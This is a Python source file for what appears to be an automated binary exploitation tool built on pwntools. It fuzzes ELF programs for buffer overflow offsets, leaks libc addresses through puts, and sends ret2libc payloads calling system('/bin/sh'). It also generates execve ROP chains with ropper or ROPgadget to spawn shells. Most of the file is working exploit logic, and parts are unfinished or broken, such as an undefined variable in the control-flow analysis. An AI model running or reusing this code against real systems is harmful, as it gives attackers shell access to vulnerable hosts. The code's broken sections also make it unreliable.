from pwn import *
import re, os, sys, subprocess, pwnlib, binascii, linecache, random, string, shutil, pwnlib, future
from barf import BARF
from barf.core.reil import ReilMnemonic
from barf.core.symbols import load_symbols
from barf.analysis.graphs.callgraph import CallGraph

import networkx
global config, remlib


def init(confi):
    global config, bufferA, toolpa, rop, e
    context.log_level = "WARNING"
    logGen = log.progress("Stage 1", level=31)
    logGen.status("Booting Up....")
    config = confi
    context.binary = config._elf
    # context.log_level="DEBUG"
    e = config._elf
    rop = ROP(e)
    toolpa = config._toolpa
    if config._dev:
        # logbar = LogicBARF()
        logic = LogicParser()
        logic.selectAnalMode("patch")
        logbar = LogicBARF()
    logGen.success("Finished!")

    return True


def recvleak(rm):  # TODO recv\n ?
    try:
        tmp = rm.recvline().strip().ljust(context.bytes, "\x00")
        return u(tmp), rm
    except:
        print("recvLeak didnt work (maybe cleaning too much?)")
        print(tmp)
        exit(0)


def midroll(rm):
    return config.midroll(rm)


def postroll(rm):
    return config.postroll(rm)


def preroll(rm):
    return config.preroll(rm)


def fingad(gadlis):
    return p(rop.find_gadget(gadlis)[0])


def fplt(sym):
    return p(e.plt[sym])


def fsym(sym):
    return p(e.symbols[sym])


def fgot(sym):
    return p(e.got[sym])


def p(x):
    return pack(x)


def u(x):
    return unpack(x)


def randomString(stringLength):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))


def escape_ansi(lin):
    ansi_escape = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    return ansi_escape.sub('', lin)


def i2hs(zahl):
    return str(hex(zahl))


def hs2i(hexstr):
    return int(hexstr, 16)


class OffGet:
    def __init__(self, lib, libcmain):  # lib is id if rem else libcobject
        # print hex(libcmain)
        if remlib:
            os.system(toolpa + "libcdb/dump " + lib + " > offsets")
            os.system(toolpa + "libcdb/dump " + lib + " __libc_start_main >> offsets")
            os.system(toolpa + "libcdb/dump " + lib + " exit >> offsets")
            off = open("offsets", "r")
            offsets = off.read().split("\n")
            off.close()
            os.remove("offsets")
            osplt = lambda x: int((offsets[x]).split(" = ")[1], 0)
            self.offset___libc_start_main_ret = osplt(0)
            self.offset_system = osplt(1)
            self.offset_dup2 = osplt(2)
            self.offset_read = osplt(3)
            self.offset_write = osplt(4)
            self.offset_str_bin_sh = osplt(5)
            self.offset__libc_start_main = osplt(6)
            self.offset_exit = osplt(7)
            self.libcbase = libcmain - self.offset__libc_start_main
            self.BINSH = self.libcbase + self.offset_str_bin_sh
            self.EXIT = self.libcbase + self.offset_exit
            self.SYSTEM = self.libcbase + self.offset_system
        else:
            self.libcbase = libcmain - lib.sym["__libc_start_main"]
            self.BINSH = self.libcbase + next(lib.search("/bin/sh"))  # Verify with find /bin/sh
            self.SYSTEM = self.libcbase + lib.sym["system"]
            self.EXIT = self.libcbase + lib.sym["exit"]

    def loadBSE(self):
        return p(self.BINSH) + p(self.SYSTEM) + p(self.EXIT)


class libMe:
    def __init__(self):
        self.logGen = log.progress("Stage 3", level=31)
        config._logGen = self.logGen
        self.logGen.status("Ret2Libc Attack!")
        self.symbls = map(str, e.plt)
        self.libMain()

    def libMain(self):
        global remlib, bufferA
        remlib = False
        if config._debugfinalPayload:
            context.log_level = "debug"
        if config._manuallibc:  # TODO fix the libc local and manual thingy e.g. LD_PRELOAD??
            libELF = ELF(config._pathtolibc)
        elif config._LocalOnly:
            libELF = e.libc
            if libELF is None:
                libELF = ELF(config._pathtolibc)
        else:
            remlib = True
            liblist = self.libfinder(bufferA)
        self.logGen.status("Libc\s found!")
        if remlib:
            liblist = liblist[::-1]
            for lib in liblist:
                self.logGen.status("Trying now libc " + lib)
                self.libPayloader(lib)
        else:
            if config._debugfinalPayload:
                print(libELF.path)
            self.logGen.status("Trying now libc " + libELF.path)
            self.libPayloader(libELF)
        self.logGen.failure("Nothing worked! Go play some Quake!")
        exit(0)

    def leakloader(self):  # Atomic
        getter = [['pop rdi', 'ret']]
        for gadsym in self.symbls:
            if "puts" == gadsym:
                puts_plt = fplt("puts")
                for gettr in getter:
                    try:
                        getwww = fingad(gettr)
                        libc_start_main = fsym("__libc_start_main")
                        return getwww + libc_start_main + puts_plt, getwww
                    except:
                        print("No " + gettr.join(" "))
                        print("need to implement moar gettr!")
                        exit(0)
                else:
                    print("WWWWOOOPOPOSOPS")
                    print("Need to implement moar leaker(read?)")  # TODO MOAR READ!
                    exit(0)

    def libPayloader(self, lib):
        load, gettr = self.leakloader()
        config._LDPRE = True
        rm = self.libsend(bufferA + load + p(e.entry))
        config._LDPRE = False
        libcmain, rm = recvleak(rm)
        load = OffGet(lib, libcmain).loadBSE()
        payload2 = bufferA + gettr + load
        rm = midroll(rm)
        self.logGen.status("Sending Payload!")
        try:
            if config._debugfinalPayloadCore:
                config.debugPayload(rm, payload2)
            else:
                config.SnC(rm, payload2)
        except NameError:
            exit(0)
        except:
            pass
            print("Breaking at libPayloader")  # TODO check if needed

    def libleaker(self, buff):
        load, dump = self.leakloader()
        payload = buff + load
        if config._debugfinalPayload:
            context.log_level = "debug"
        libcmain, rm = recvleak(self.libsend(payload))
        return libcmain

    def libsend(self, payload):  # Atomic
        rm = preroll(config._LocalOnly)
        rm.sendline(payload)
        rm = postroll(rm)
        return rm

    def libfinder(self, buff):
        libcmain = self.libleaker(buff)
        global toolpa
        lib = lambda x: (x.split("id ")[1]).split(")")[0]
        os.system(toolpa + "libcdb/find __libc_start_main " + hex(libcmain) + ">libcanal")
        lican = open("libcanal", "r")
        licanal = lican.read().split("\n")
        lenli = len(licanal)
        licanal = licanal[:lenli - 1]
        lican.close()
        os.remove("libcanal")
        liblist = map(lib, licanal)
        return liblist


class Buff:
    def __init__(self):
        self.payroll = config._payroll
        self.UseCore = config._UseCore

    def finder(self):
        global bufferA
        self.logBuf = log.progress("Stage 2", level=31)
        if self.UseCore:
            self.logBuf.status("Trying to find Buffer with Coredumps!")
            buflen = self.finderCore()
            bufferA = buflen * "D"
            return buflen
        else:
            self.logBuf.status("Trying to find Buffer!")
            buflen = self.finderNoCore()
            bufferA = buflen * "D"
            return buflen

    def finderCore(self):
        try:
            os.remove("./core")
        except:
            pass
        self.logBuf.status("Buffer lenght = " + str(self.payroll))
        while (True):
            pr = preroll(True)
            self.logBuf.status(str(self.payroll))
            buff = cyclic(self.payroll)
            pr.sendline(buff)
            try:
                context.log_level = "ERROR"
                core = Coredump("./core")
                context.log_level = "WARNING"
            except:
                self.payroll += 100
                continue
            if p(core.fault_addr) not in buff:  # TODO does p instead of p64 work?
                self.payroll += 100
                continue
            else:
                context.log_level = "ERROR"
                tarBufLen = cyclic_find(p(core.fault_addr), n=4)
                context.log_level = "WARNING"
                self.logBuf.success("Finished! Buffer lenght = " + str(tarBufLen) + " Found!")
                return tarBufLen

    def finderNoCore(self):
        while (True):
            pr = preroll(True)
            self.logBuf.status("Buffer lenght = " + str(self.payroll))
            buff = cyclic(self.payroll)
            pr.sendline(buff)
            sleep(0.1)
            if pr.poll() == -11:
                self.logBuf.success("Buffer lenght = " + str(self.payroll + 8) + " Found!")
                return (self.payroll + 8)  # TODO Fix hardcoded offset thingy
            else:
                pr.kill()
                pr.close()
                self.payroll += 1


class RoPChain:
    def __init__(self):
        self.generator = config._generator
        self.logRop = log.progress("Stage 3", level=31)
        config._logGen = self.logRop
        self.ShellCom = config._shellcmd
        self.binaryfile = config._binaryfile
        self.ropMain()

    def ropMain(self):
        global bufferA
        with context.local(log_level='ERROR'):
            # sleep(0.1)
            ropcode = self.ropchain()
            # sleep(0.1)
        if ropcode == None:
            print("empty ropchain ! maybe something broken or wrong attack type!")  # TODO Implement attack logic
            exit(0)
        self.logRop.status("RopChain found! ")
        payload = bufferA + ropcode
        self.logRop.status("connecting to target server!")
        rm = preroll(config._LocalOnly)
        if config._debugfinalPayloadCore:
            config.debugPayload(rm, payload)
        else:
            config.SnC(rm, payload)

    def ropchain(self):  # Todo implement more Generators and features
        global generator
        self.logRop.status("Trying to generate a RopChain with Ropper!")
        gens = {"ropper": self.ropchainRopper, "ropperService": self.ropchainRopper, "RopGad": self.ropchainGadget,
                # TODO wait for RopperService
                "RopGen": self.ropchainGenerator}
        funct = gens.get(self.generator, self.ropchainRopper)
        payload = funct()
        return payload

    def ropchainRopper(self):  # Superfast and working TODO implement more CMDS
        self.logRop.status("")
        Com = "execve "
        if self.ShellCom:
            Com = "'" + Com + "cmd=" + self.ShellCom + "'"
        command = "ropper -f " + self.binaryfile + " --chain " + Com + " > shellcode.txt"
        out = self.chainer(command)
        # =====================================================# checking for failure
        failmsg = "# INSERT SYSCALL GADGET HERE"
        if failmsg in out:
            self.logRop.status("Ropper didnt work! trying ROPgadget now!")
            return self.ropchainGadget()
        # =====================================================#
        code = out.split("generator #\n")[1]
        tes = code.split("\n")
        lentes = len(tes)
        for x in range(lentes):
            tes[x] = tes[x].lstrip()
        res = tes[6:lentes - 2]
        pay = "from struct import pack\n" + tes[4] + "\ndef p(x):\n    return pack('<Q',x)\ndef rebase_0(x):\n    " + \
              tes[4] + "\n    return pack('<Q',x+IMAGE_BASE_0)\ndef loader():\n" + "\n    ".join(
            res) + "\n    return rop"

        self.logRop.status("RopChain Generated! Let's pop some Shells!")
        return self.chainloader(pay)

    def ropchainGadget(self):  # Not working so good but more often used
        command = "ROPgadget --ropchain --binary " + self.binaryfile + " > shellcode.txt"
        out = self.chainer(command)
        # =====================================================# checking for failure
        failmsg = "Can't find"
        if failmsg in out:
            self.logRop.status("ROPgadget didnt work! trying ROPGenerator now!")
            try:
                return self.ropchainGenerator()
            except:
                self.logRop.status("ROPgenerator isnt installed! trying something different now!")
                return None
        # =====================================================#
        code = out.split("# execve generated by ROPgadget")[1]
        tes = code.split("\n")
        lentes = len(tes)
        for x in range(lentes):
            tes[x] = tes[x].lstrip()
        res = tes[4:lentes - 2]
        pay = "def loader():\n    " + "\n    ".join(res) + "\n    return p"
        self.logRop.status("RopChain Generated! Let's pop some Shells!")
        return self.chainloader(pay)

    def ropchainGenerator(self):
        print("not Implemented Yet RopGenerator")  # TODO IMPLEMENT
        exit(0)

    def chainloader(self, pay):
        pay = escape_ansi(pay)
        module = open("./ABEModules/payloader.py", "w")
        module.write(pay)
        module.close()
        from payloader import loader
        load = loader()
        module = open("./ABEModules/payloader.py", "w")
        module.write("def loader():\n    return None")
        module.close()
        return load

    def chainer(self, command):
        os.system(command)
        output = open("shellcode.txt", "r")
        out = output.read()
        output.close()
        os.remove("shellcode.txt")
        return out


class LogicParser:

    def __init__(self):
        # TODO stuff
        self.base = e.address
        if config._debugfinalPayload:
            print(i2hs(self.base))
        self.graph = dict()
        self.binfo = dict()
        self.mapline = dict()  # <address> -> linenumber
        self.lines = list()
        self.callmap = dict()  # <address> -> user input function@got
        self.gotlook = dict()  # <address> -> function@got
        if config._debugfinalPayload:
            print(i2hs(e.entry))
        self.uincalls = ["__isoc99_scanf", "read", "__isoc99_wscanf", "__isoc99_vsscanf", "__isoc99_sscanf",
                         "__isoc99_vfwscanf", "__isoc99_fscanf", "__vsscanf", "__isoc99_vfscanf", "__isoc99_vscanf",
                         "__vfscanf", "__isoc99_swscanf", "__isoc99_vswscanf", "__isoc99_vwscanf", "__isoc99_fwscanf",
                         "__libc_read", "__read", "fgets", "gets", "fgetc", "getc", "fread",
                         "fscanf"]  # TODO expand user input functions
        self.outcall = ["puts", "printf", "write"]
        self.failcall =["__stack_chk_fail",]
        self.elf = file(config._binaryfile, "rb")
        self.maplines()
        try:
            self.main = e.sym["main"]
        except:
            self.main = hs2i(self.findMain())
        self.end = None
        self.stepper = self.mapline[i2hs(self.main)]  # HINT stepper ::= linenumber
        self.uinCallmapper()
        self.oneLiner(self.stepper)
        config._main = self.main
        config._end = self.end

        # print(self.gotlook)
        # ==========DEBUG=============#
        for key in sorted(self.graph):
            print "%s: %s" % (key, self.graph[key])
        # ==========DEBUG=============#

    def selectAnalMode(self, choice):
        modes = {"patch": self.patchMain, "revIfs": self.revIfsMain}
        funct = modes.get(choice)
        funct()

    def revIfsMain(self):
        self.patchMain()
        # ==========DEBUG=============#
        if config._debugfinalPayload:
            for key in sorted(self.graph):
                print "%s: %s" % (key, self.graph[key])
        # ==========DEBUG=============#
        firstin = "AAAAAAAA"
        inlist = self.refIfs([firstin])[:-1]
        config._input = inlist
        if config._debugfinalPayload:
            print(inlist)

    def refIfs(self, inputlist):
        if config._debugfinalPayload:
            print("=====Inputlist=====")
            print inputlist
            print("=====Inputlist=====")
        tlines = self.ltracer(e.path, inputlist)
        step = -1
        lastin = inputlist[-1]
        outputs = list()
        while (True):
            step += 1
            line = tlines[step]
            if "exited" in line:
                break
            naddr = i2hs(self.base + hs2i(line.split("[")[1].split("]")[0]))
            call = line.split("] ")[1].split("(")[0]
            if call in self.outcall:
                if '"' in line:
                    strout = line.split('"')[1]
                    if config._debugfinalPayload:
                        print("Caught Call " + call)
                    if "puts" in call:
                        outputs.append(strout)
                    elif "write" in call:
                        fp = line.split("(")[1].split(",")[0]
                        if "1" is fp:
                            outputs.append(strout)
                        else:
                            print("Write filepointer :" + fp)
                    # TODO implement printf
                    # self.binfo["lbefore"]=line.split('"')[1]
                    continue
                else:
                    print("Implement case for read from pointer" + line)
                    # TODO Implement case for read from pointer
                    # should not be needed...
                    exit(0)
            elif call in self.uincalls:
                outputs = list()
                if config._debugfinalPayload:
                    print("CAUGHT UINPUT " + call)
                # TODO? Stuff?
                continue
            elif "strncmp" == call:
                if lastin in line:
                    # TODO catch strings like ""test""
                    a = line.split('"')[1]
                    b = line.split('"')[3]
                    if a not in b or b not in a:
                        if lastin in a:
                            comp = b
                        else:
                            comp = a
                        if "AAAAAAAA" in lastin:  # This case marks first cycle
                            inputlistn = [comp, "BBBBBBBB"]
                            return self.refIfs(inputlistn)
                        else:
                            inputlistn = (inputlist[:-1]).extend([comp, "BBBBBBBB"])
                            return self.refIfs(inputlistn)
                    else:
                        print("TESTCASE?")
                        continue
            else:
                if config._debugfinalPayload:
                    print("Unknown call :" + call)
        config._output = outputs
        return inputlist

    #   binfo ::= {<lbefore>:<string_to_recvuntil>,<lafter>:<int>,

    def findMain(self):
        linum = self.mapline[i2hs(e.entry)]
        while (True):
            line = self.lines[linum]
            if "call" in line:
                linum -= 1
                break
            else:
                linum += 1
        line = self.lines[linum]
        tar = i2hs(hs2i(line.split(" 0x")[1]))
        if config._debugfinalPayload:
            print(tar)
        return tar

    def patchMain(self):
        try:
            shutil.rmtree("./tmp/")
        except:
            pass
        try:
            os.mkdir("./tmp")
        except:
            pass
        boolist = []
        e.save(e.path.split(config._binaryfile)[0] + "tmp/" + config._binaryfile)
        self.patchELF("./tmp/" + config._binaryfile, i2hs(self.main), None, False, [i2hs(self.main)], 0, boolist)
        shutil.rmtree("./tmp/")  # TODO? comment line to keep files for testing

    def uinCallmapper(self):

        for key in e.got:
            self.gotlook[i2hs(e.got[key])] = key
        for x in self.uincalls:
            try:
                self.callmap[i2hs(e.got[x])] = x
            except:
                pass
        # TODO dict of {<address> : function that takes user input,...}
        pass

    def oneLiner(self, stepper):
        while (True):
            line = self.lines[stepper]
            addr = self.addFline(stepper)
            if "jmp" in line:
                if addr not in self.graph:
                    tat = self.appendJmp(addr, line)
                    self.oneLiner(self.mapline[tat])
                    break  # TODO really break?
            elif "j" in line:
                if addr not in self.graph:
                    tat = self.appendConJump(addr, line, stepper)
                    self.oneLiner(self.mapline[tat])
                stepper += 1
                continue
            elif "call" in line:
                if addr not in self.graph:
                    self.isCallInput(addr, line)
                stepper += 1
                continue
            elif "leave" in line:
                if addr not in self.graph:  # TODO check if "if" is needed?
                    self.appendEnd(addr)
                break
            elif "ret" in line:
                if addr not in self.graph:  # TODO check if "if" is needed?
                    self.appendRet(addr)
                break
            else:
                stepper += 1

    def patchELF(self, tmpfilename, adr, ret, uin, checklist, inum, boolist):
        tmpname = "./tmp/" + config._binaryfile
        # print(tmpfilename)

        tmp = ELF("" + tmpfilename)
        nextname = randomString(6)
        tmpnext = tmpname + nextname
        linum = self.mapline[adr]
        while (True):
            addr = self.addFline(linum)
            if addr in self.graph:

                # print("Got in")

                turn = self.graph[addr]
                type = turn["type"]
                if type == "jmp":

                    # print("jumping")
                    bol = boolist
                    bol.extend([{adr: {"typ": None, "tar": turn["tarAddrTrue"]}}])
                    self.patchELF(tmpfilename, turn["tarAddrTrue"], None, uin, checklist, inum, bol)
                    break
                elif type == "conjmp":
                    if turn["tarAddrTrue"] not in checklist:
                        tmp.asm(hs2i(addr), "jmp " + i2hs(hs2i(turn["tarAddrTrue"]) - self.base))
                        tmp.save(tmpnext)
                        checklist.append(turn["tarAddrTrue"])
                        bol = boolist
                        bol.extend([{adr: {"typ": True, "tar": turn["tarAddrTrue"]}}])
                        self.patchELF(tmpnext, turn["tarAddrTrue"], None, uin, checklist, inum, bol)
                    tmp.asm(hs2i(addr), "nop")
                    tmp.save(tmpnext)
                    checklist.append(turn["tarAddrFalse"])
                    bol = boolist
                    bol.extend([{adr: {"typ": False, "tar": turn["tarAddrFalse"]}}])
                    self.patchELF(tmpnext, turn["tarAddrFalse"], None, uin, checklist, inum, bol)
                    break
                elif type == "end":
                    if uin:
                        self.checkVuln(tmpfilename, boolist)
                    else:
                        pass
                        # print("dead end detected!")

                    break
                elif type == "call_function":
                    self.patchELF(tmpfilename, turn["tarAddrTrue"], turn["tarAddrFalse"], uin, checklist, inum, boolist)
                    break  # TODO do i need a break here??
                elif type == "ret":

                    # print("returning")

                    self.patchELF(tmpfilename, ret, None, uin, checklist, inum, boolist)
                    break
                elif type == "uinput":
                    inum += 1
                    if "flags" in turn:
                        flags = turn["flags"]
                        flags["InputNum"] = inum

                    else:
                        turn["flags"] = {"InputNum": 1}

                    uin = True
                    pass
                elif type == "call_libc":
                    if turn["conditionType"] is "__stack_chk_fail":
                        break
                else:
                    print("forgot Type :" + type)
                    exit(0)
                linum += 1
            else:
                linum += 1
                # print("Next line")

    def isCallInput(self, addr, line):
        # TODO check if user Input gets called(scanf)
        tar = i2hs(self.base + hs2i(line.split(" 0x")[1]))
        taf = self.addFline(self.mapline[addr] + 1)
        calltar = self.followJmp(tar)
        if calltar is None:  # Checks if call target is a function or a stub(libc)
            self.graph[addr] = {"type": "call_function", "tarAddrTrue": tar, "tarAddrFalse": taf, "conditionType": None}
            self.oneLiner(self.mapline[tar])
        elif calltar in self.callmap:
            self.graph[addr] = {"type": "uinput", "tarAddrTrue": calltar, "tarAddrFalse": taf,
                                "conditionType": self.callmap[calltar]}
        else:
            self.graph[addr] = {"type": "call_libc", "tarAddrTrue": calltar, "tarAddrFalse": taf,
                                "conditionType": self.gotlook[self.followJmp(tar)]}

    def appendConJump(self, addr, line, linenumber):
        tat = i2hs(self.base + hs2i(line.split(" 0x")[1]))
        taf = self.addFline(linenumber + 1)
        self.graph[addr] = {"type": "conjmp", "tarAddrTrue": tat, "tarAddrFalse": taf,
                            "conditionType": line.split("j")[1].split(" ")[0]}
        return tat

    def appendJmp(self, addr, line):
        # TODO add start / target address to map and set flags according to conditionals
        tat = i2hs(self.base + hs2i(line.split(" 0x")[1]))
        self.graph[addr] = {"type": "jmp", "tarAddrTrue": tat, "tarAddrFalse": None, "conditionType": None}
        return tat
        pass

    def appendEnd(self, addr):
        # TODO mark DeadEnd in map
        endaddr = hs2i(self.addFline(self.mapline[addr] + 1))
        if self.end < endaddr: self.end = endaddr
        self.graph[addr] = {"type": "end", "tarAddrTrue": None, "tarAddrFalse": None, "conditionType": None}

    def appendRet(self, addr):
        # TODO mark Ret in map
        self.graph[addr] = {"type": "ret", "tarAddrTrue": None, "tarAddrFalse": None, "conditionType": None}

    def foreachDo(self):
        # TODO run function for each conditional or config
        pass

    def followJmp(self, addr):
        try:
            lin = self.mapline[addr]
            line = self.lines[lin]
        except:
            print("Error Address not mapped!")
            exit(0)
        try:
            return i2hs(self.base + hs2i(line.split(" 0x")[1]))
        except:
            return None

    def addFline(self, linenumber):  # TODO optimize by building a dict: <linenumber> -> <address> once
        return self.mapline.keys()[self.mapline.values().index(linenumber)]

    def maplines(self):
        step = 0
        try:
            self.lines = disasm(self.elf.read()).split("\n")
        except:
            print("Disasm errored ! is it a binary?")
            exit(0)
        while (True):
            try:
                line = self.lines[step]
                # print(line)
            except:
                break
            if "..." in line:
                step += 1
                continue
            elif ":" in line:
                self.mapline[i2hs(self.base + hs2i(line.split(":")[0].strip()))] = step
                step += 1
            else:
                print repr(line)
                print(step)
                print("Whoopsi")
                break
        # print("DONE")
        # print self.mapline

    def readELFline(self, address):
        try:
            return self.lines[self.mapline[i2hs(address)]]
        except:
            print("Address " + i2hs(address) + " not mapped!")
            exit(0)

    def ltracer(self, binary, cmdlist):  # return list of outputlines of ltrace
        cmd = "ltrace -i -s 100 -o lout " + binary
        p = process(cmd, shell=True)
        for x in range(len(cmdlist)):
            input = cmdlist[x]
            resp = p.clean()
            p.sendline(input)
        p.clean()
        out = open("lout", "r")
        resp = out.read()
        out.close()
        os.remove("lout")
        resp = resp.split("\\n")
        resp = "".join(resp)
        if config._debugfinalPayload:
            print("========LtraceS=======")
            print(resp)
            print("========LtraceE=======")
        return resp.split("\n")

    def checkVuln(self, tmpfilename, boolist):
        # print(boolist)
        # TODO catch case of revIfs
        # TODO check if user input has vuln
        pass


# TODO json / dict file :
#   {"<address1>":{"type":type,"tarAddrTrue":<address>,"tarAddrFalse":<address>,"conditionType":<condition>,"flags":<flags>},"address2":...   }
#   <type> ::= jmp/conjmp/uinput/end/call (init)/ret
#   <condition> ::= gt/nz/z/eq/.../NONE for unconditinal
#   <flags> ::= single Val(firstInput)/dict of more info
#   tarAddrTrue ::= <address> for jumping or NONE if uinput/end
#   tarAddrFalse ::= <address> for next line or NONE

class LogicBARF:

    def __init__(self):

        self.barf = BARF(config._binaryfile)
        self.logger = logging.getLogger(__name__)
        self.start_addr = config._main
        self.end_addr = config._end
        self.symbols_by_addr=load_symbols(config._binaryfile)
        print(i2hs(self.start_addr))
        print(i2hs(self.end_addr))
        self.entries=None
        self.cfgs = None
        self.cg = None
        self.LogBarMain()
        exit(0)

    def LogBarMain(self):
        if len(self.symbols_by_addr) > 0:
            self.entries = [addr for addr in sorted(self.symbols_by_addr.keys())]
        else:
            self.entries = [self.barf.binary.entry_point]
        self.cfgs = self.barf.recover_cfg_all(self.entries, symbols=self.symbols_by_addr)
        print(self.symbols_by_addr)
        print(map(i2hs,self.entries))
        cfgs_filtered = []
        for cfg in cfgs:
            if len(cfg.basic_blocks) == 0:
                continue
            cfgs_filtered.append(cfg)
            self.cg = CallGraph(cfgs_filtered)












    def check_path_satisfiability(self, code_analyzer, path, start_address):
        start_instr_found = False
        sat = False
        # Traverse basic blocks, translate its instructions to SMT
        # expressions and add them as assertions.
        for bb_curr, bb_next in zip(path[:-1], path[1:]):
            self.logger.info("BB @ {:#x}".format(bb_curr.address))
            # For each instruction...
            for instr in bb_curr:
                # If the start instruction have not been found, keep
                # looking...
                if not start_instr_found:
                    if instr.address == start_address:
                        start_instr_found = True
                    else:
                        continue
                self.logger.info("{:#x} {}".format(instr.address, instr))

                # For each REIL instruction...
                for reil_instr in instr.ir_instrs:
                    self.logger.info("{:#x} {:02d} {}".format(reil_instr.address >> 0x8, reil_instr.address & 0xff,
                                                              reil_instr))

                    if reil_instr.mnemonic == ReilMnemonic.JCC:
                        # Check that the JCC is the last instruction of
                        # the basic block (skip CALL instructions.)
                        if instr.address + instr.size - 1 != bb_curr.end_address:
                            self.logger.error(
                                "Unexpected JCC instruction: {:#x} {} ({})".format(instr.address, instr, reil_instr))
                            # raise Exception()
                            continue

                        # Make sure branch target address from current
                        # basic block is the start address of the next.
                        assert (bb_curr.taken_branch == bb_next.address or
                                bb_curr.not_taken_branch == bb_next.address or
                                bb_curr.direct_branch == bb_next.address)
                        # Set branch condition accordingly.
                        if bb_curr.taken_branch == bb_next.address:
                            branch_var_goal = 0x1
                        elif bb_curr.not_taken_branch == bb_next.address:
                            branch_var_goal = 0x0
                        else:
                            continue
                        # Add branch condition goal constraint.
                        code_analyzer.add_constraint(
                            code_analyzer.get_operand_expr(reil_instr.operands[0]) == branch_var_goal)
                        # The JCC instruction was the last within the
                        # current basic block. End this iteration and
                        # start next one.
                        break
                    # Translate and add SMT expressions to the solver.
                    code_analyzer.add_instruction(reil_instr)

            sat = code_analyzer.check() == 'sat'
            self.logger.info("BB @ {:#x} sat? {}".format(bb_curr.address, sat))
            if not sat:
                break
        # Return satisfiability.
        return sat
